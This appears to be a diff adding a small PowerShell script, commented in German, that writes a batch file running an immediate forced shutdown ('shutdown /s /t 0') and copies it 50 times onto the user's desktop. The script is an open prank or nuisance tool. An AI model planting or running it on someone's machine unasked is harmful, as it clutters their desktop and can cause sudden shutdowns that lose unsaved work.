@@ -1,0 +1,17 @@
+# shutdown.ps1 - Shutdown-Batchdateien auf Desktop verteilen
+
+$desktop = [Environment]::GetFolderPath("Desktop")
+$batName = "shutdown.bat"
+$batPath = Join-Path $desktop $batName
+$copyCount = 50
+
+# Shutdown-Batch erstellen
+$batContent = "@echo off`nshutdown /s /t 0"
+Set-Content -Path $batPath -Value $batContent -Encoding ASCII
+Write-Host "✅ Shutdown-Batch erstellt: $batPath"
+
+# Batchdateien mehrfach kopieren
+for ($i = 1; $i -le $copyCount; $i++) {
+    Copy-Item -Path $batPath -Destination (Join-Path $desktop ("shutdown_$i.bat")) -Force
+}
+Write-Host "🖥️ Desktop mit $copyCount Shutdown-Batchdateien befüllt."
